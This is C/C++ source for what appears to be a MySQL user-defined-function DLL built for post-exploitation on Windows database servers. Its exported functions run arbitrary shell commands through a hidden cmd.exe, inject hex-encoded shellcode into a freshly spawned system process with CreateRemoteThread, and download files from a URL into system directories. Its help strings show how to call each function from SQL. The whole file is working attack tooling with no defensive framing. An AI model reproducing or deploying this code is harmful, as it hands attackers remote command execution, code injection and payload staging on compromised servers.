#include "stdio.h"
#include <winsock.h>
#include <Urlmon.h>
#include "mysql.h"
#pragma comment(lib, "Urlmon.lib")

HANDLE g_module;

class ThreadParams
{
public:
    char* shellcode;
    size_t  size_shellcode;
    char* ThreadProcess;
};

char* RunInject(ThreadParams* pParam)
{
    BOOL bRet = FALSE;
    size_t len = 0;
    LPSTR buff = NULL;
    char* procssName = NULL;

    buff = pParam->shellcode;
    len = pParam->size_shellcode;
    procssName = pParam->ThreadProcess;
    if (!procssName || !buff || !len) {
        return "[-]Parameters error.";
    }

    char* _Post_ _Notnull_ shellcode = (char*)calloc(len / 2, sizeof(unsigned char));
    size_t size = len / 2 * sizeof(unsigned char);
    for (size_t count = 0; count < len / 2; count++) {
        sscanf_s(buff, "%02hhx", &shellcode[count]);
        buff += 2;
    }

    char RunProcss[MAX_PATH] = { 0 };
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    LPVOID lpnewVictimBaseAddr;
    HANDLE hThread;

    GetSystemDirectory(RunProcss, MAX_PATH);
    strcat_s(RunProcss, "\\");
    strcat_s(RunProcss, procssName);
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
	
    if (CreateProcess(RunProcss, NULL, NULL, NULL,
        FALSE, CREATE_SUSPENDED
        , NULL, NULL, &si, &pi) == 0)
    {
        return "[-]CreateProcess error!";
    }

    lpnewVictimBaseAddr = VirtualAllocEx(pi.hProcess
        , NULL, size + 1, MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (lpnewVictimBaseAddr == NULL)
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return "[-]VirtualAllocEx error!";
    }

    if (!WriteProcessMemory(pi.hProcess, lpnewVictimBaseAddr,
        (LPVOID)shellcode, size + 1, NULL)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return "[-]WriteProcessMemory error!";
    }

    hThread = CreateRemoteThread(pi.hProcess, 0, 0,
        (LPTHREAD_START_ROUTINE)lpnewVictimBaseAddr, NULL, 0, NULL);
    if (!hThread) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return "[-]CreateRemoteThread error!";
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return "[+]Inject successfully.";
}

BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
        g_module = hModule;
    return TRUE;
}

extern "C" __declspec(dllexport)my_bool sys_exec_init(MSXU_INIT * initid, MSXU_ARGS * args, char* message)
{
    initid->max_length = 65 * 1024 * 1024;
    return 0;
}
extern "C" __declspec(dllexport)char* sys_exec(MSXU_INIT * initid, MSXU_ARGS * args,
    char* result, unsigned long* length, char* is_null, char* error)
{
    if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT || _stricmp(args->args[0], "help") == 0)
    {
        initid->ptr = (char*)malloc(200);
        if (initid->ptr == NULL)return NULL;
        strcpy_s(initid->ptr, 200, "select sys_exec(\"dir c:\\\\\"); select sys_exec(\"powershell -x-x\"); ");
        *length = (size_t)strlen(initid->ptr);
        return initid->ptr;
    }
    int Sta = 0;
    char* cmdline;
    char temp_path[MAX_PATH] = { 0 };
    char cmd_path[MAX_PATH] = { 0 };
    char runtemp[150] = { 0 };
    DWORD size = 0, len = 0;
    HANDLE hFile;
    GetSystemDirectory(cmd_path, MAX_PATH - 1);
    strcat_s(cmd_path, strlen(cmd_path) + strlen("\\cmd.exe") + 1, "\\cmd.exe");
    GetEnvironmentVariable("temp", temp_path, MAX_PATH - 1);
    strcat_s(temp_path, strlen(temp_path) + strlen("\\661fe301d46dbf90e6a.txt") + 1, "\\661fe301d46dbf90e6a.txt");

    size_t size_cmdline = strlen(args->args[0]) + strlen(temp_path) + 50;
    cmdline = (char*)malloc(size_cmdline);
    if (cmdline == NULL) return NULL;
    strcpy_s(cmdline, strlen(cmdline) + strlen(" /c ") + 1, " /c ");
    strcat_s(cmdline, strlen(cmdline) + strlen(args->args[0]) + 1, (args->args[0]));
    strcat_s(cmdline, strlen(cmdline) + strlen(" > ") + 1, " > ");
    strcat_s(cmdline, strlen(cmdline) + strlen(temp_path) + 1, temp_path);
    strcat_s(cmdline, strlen(cmdline) + strlen(" 2>&1") + 1, " 2>&1");

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.wShowWindow = SW_HIDE;
    si.cb = sizeof(si);


    Sta = CreateProcess(cmd_path, cmdline, NULL, NULL, FALSE, 0, 0, 0, &si, &pi);
    free(cmdline);
    size_t tsize = 1 * sizeof runtemp;
    if (!Sta)
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        sprintf_s(runtemp, tsize, "[-]ErrorCode:%d \n", GetLastError());
        initid->ptr = (char*)malloc(tsize);  
        if (initid->ptr == NULL) return NULL;
        strcpy_s(initid->ptr, tsize, runtemp);
        (*length) = (size_t)strlen(initid->ptr);
        return initid->ptr;
    }

    DWORD signWaitruncmd = WaitForSingleObject(pi.hProcess, 15000);
    if (WAIT_FAILED == signWaitruncmd) {
        sprintf_s(runtemp, tsize, "%s", "[-]WaitForSingleObject WAIT_FAILED Failed.\n");
        initid->ptr = (char*)malloc(tsize + 1);   
        if (initid->ptr == NULL) return NULL;
        strcpy_s(initid->ptr, tsize, runtemp);
        (*length) = (size_t)strlen(initid->ptr);
        return initid->ptr;
    }
    else if (WAIT_TIMEOUT == signWaitruncmd) {
        sprintf_s(runtemp, tsize, "%s", "[-]WaitForSingleObject TIMEOUT.\n");
        initid->ptr = (char*)malloc(tsize + 1);
        if (initid->ptr == NULL) return NULL;
        strcpy_s(initid->ptr, tsize, runtemp);
        (*length) = (size_t)strlen(initid->ptr);
        return initid->ptr;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    hFile = CreateFile(temp_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);

    if (hFile != INVALID_HANDLE_VALUE)
    {
        size = GetFileSize(hFile, NULL);
        if (size < 2) {
            initid->ptr = (char*)malloc(100);
            if (initid->ptr == NULL) return NULL;
            strcpy_s(initid->ptr, 100, "[-]Command failed GetFileSize: 0");
            (*length) = (size_t)strlen(initid->ptr);
            return initid->ptr;
        }
        initid->ptr = (char*)malloc((size_t)(size)+100); // if size = 0, +100
        if (initid->ptr == NULL) return NULL;
        BOOL bResult = ReadFile(hFile, initid->ptr, size + 1, &len, NULL);
        CloseHandle(hFile);
        DeleteFile(temp_path);
        if (bResult && (len == size)) {
            (initid->ptr)[size - 1] = '\0';
        }
        else {
            sprintf_s(initid->ptr, 100, "[-]ReadFile error:%d", GetLastError());
            (*length) = (size_t)strlen(initid->ptr);
            return initid->ptr;
        }
    }
    else
    {
        initid->ptr = (char*)malloc(100);
        if (initid->ptr == NULL) return NULL;
        strcpy_s(initid->ptr, 2, "");
    }
    (*length) = (size_t)strlen(initid->ptr);
    return initid->ptr;

}
extern "C" __declspec(dllexport)void sys_exec_deinit(MSXU_INIT * initid)
{
    if (initid->ptr != NULL)
        free(initid->ptr);
}

extern "C" __declspec(dllexport)my_bool inject_init(MSXU_INIT * initid, MSXU_ARGS * args, char* message)
{
    initid->max_length = 65 * 1024 * 1024;
    return 0;
}
extern "C" __declspec(dllexport)char* inject(MSXU_INIT * initid, MSXU_ARGS * args, char* result, unsigned long* length, char* is_null, char* error)
{
    initid->ptr = (char*)malloc(200);  
    if (initid->ptr == NULL) return NULL;

    if (!args->args[0]) {
        strcpy_s(initid->ptr, 200, "[-]File not found.");
        (*length) = (size_t)strlen(initid->ptr);
        return initid->ptr;
    }

    if (args->arg_count != 2 || args->arg_type[0] != STRING_RESULT || args->arg_type[1] != STRING_RESULT || _stricmp(args->args[0], "help") == 0)
    {
        strcpy_s(initid->ptr, 200, "[*]select inject(\"Process\",\"shellcode\");");
        *length = (size_t)strlen(initid->ptr);
        return initid->ptr;
    }

    const char division = '.';
    char* ret;
    ret = strchr((args->args[1]), division);
    if (!ret) {
        strcpy_s(initid->ptr, 200, "[*]select inject(hex(load_file(\"(x86 x64)_shellcode.bin\")),\"rundll32.exe\");");
        *length = (size_t)strlen(initid->ptr);
        return initid->ptr;
    }
    if (_stricmp(ret, ".exe") != 0) {
        strcpy_s(initid->ptr, 200, "[*]select inject(hex(load_file(\"(x86 x64)_shellcode.bin\")),\"rundll32.exe\");");
        *length = (size_t)strlen(initid->ptr);
        return initid->ptr;
    }

    ThreadParams* pParam = new ThreadParams;
    char* shellcode = NULL;
    size_t size_shellcode = strlen((args->args[0]));
    shellcode = (char*)malloc(size_shellcode + 20);
    if (shellcode == NULL) return NULL;
    strcpy_s(shellcode, strlen(shellcode) + size_shellcode + 1, (args->args[0]));
    pParam->shellcode = shellcode;
    pParam->size_shellcode = size_shellcode;
    pParam->ThreadProcess = (args->args[1]);
    char * Rst =  RunInject(pParam);
    free(shellcode);
    strcpy_s(initid->ptr, 200, Rst);
    *length = strlen(initid->ptr);
    return initid->ptr;
}
extern "C" __declspec(dllexport)void inject_deinit(MSXU_INIT * initid)
{
    if (initid->ptr)
        free(initid->ptr);
}

extern "C" __declspec(dllexport)my_bool download_init(MSXU_INIT * initid, MSXU_ARGS * args, char* message)
{ 
    initid->max_length = 65 * 1024 * 1024;
    return 0;
}
extern "C" __declspec(dllexport)char* download(MSXU_INIT * initid, MSXU_ARGS * args, char* result, unsigned long* length, char* is_null, char* error)
{
    if (args->arg_count != 2 || args->arg_type[0] != STRING_RESULT || args->arg_type[1] != STRING_RESULT || _stricmp(args->args[0], "help") == 0)
    {
        initid->ptr = (char*)calloc(200, sizeof(char));
        if (initid->ptr == NULL)return NULL;
        strcpy_s(initid->ptr, 200, "select download(\"http://url/file.png\",\"C:\\\\winnt\\\\system32\\\\ser.exe\");");
        *length = (size_t)strlen(initid->ptr);
        return initid->ptr;
    }

    HANDLE hFile;
    char path[MAX_PATH] = { 0 };
    if (strlen((args->args)[1]) > MAX_PATH) {
        initid->ptr = (char*)calloc(100, sizeof(char));
        if (initid->ptr == NULL)return NULL;
        sprintf_s(initid->ptr, 100, "[-]Path is too long( > %d)!", MAX_PATH);
        *length = (size_t)strlen(initid->ptr);
        return initid->ptr;
    }
    strcpy_s(path, MAX_PATH, (args->args)[1]);

    hFile = CreateFile(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        initid->ptr = (char*)calloc(100 + strlen(path), sizeof(char));
        if (initid->ptr == NULL)return NULL;
        sprintf_s(initid->ptr, 100 + strlen(path), "[-]Failed, Error code:%d .", GetLastError());
        *length = (size_t)strlen(initid->ptr);
        return initid->ptr;
    }
    CloseHandle(hFile);
    DeleteFile(path);

    if (URLDownloadToFile(NULL, (args->args)[0], path, 0, 0) == S_OK)
    {
        initid->ptr = (char*)calloc(100 + strlen(path), sizeof(char));
        if (initid->ptr == NULL) return NULL;
        sprintf_s(initid->ptr, 100 + strlen(path), "[+]Download successfully,Saved in %s.", path);
        *length = strlen(initid->ptr);
        return initid->ptr;
    }
    else
    {
        initid->ptr = (char*)calloc(100 + strlen((args->args)[0]), sizeof(char));
        if (initid->ptr == NULL) return NULL;
        sprintf_s(initid->ptr, 100 + strlen((args->args)[0]), "[-]Download %s failed, error code:%d .", (args->args)[0], GetLastError());
        *length = (size_t)strlen(initid->ptr);
        return initid->ptr;

    }
}
extern "C" __declspec(dllexport)void download_deinit(MSXU_INIT * initid)
{
    if (initid->ptr)
        free(initid->ptr);
}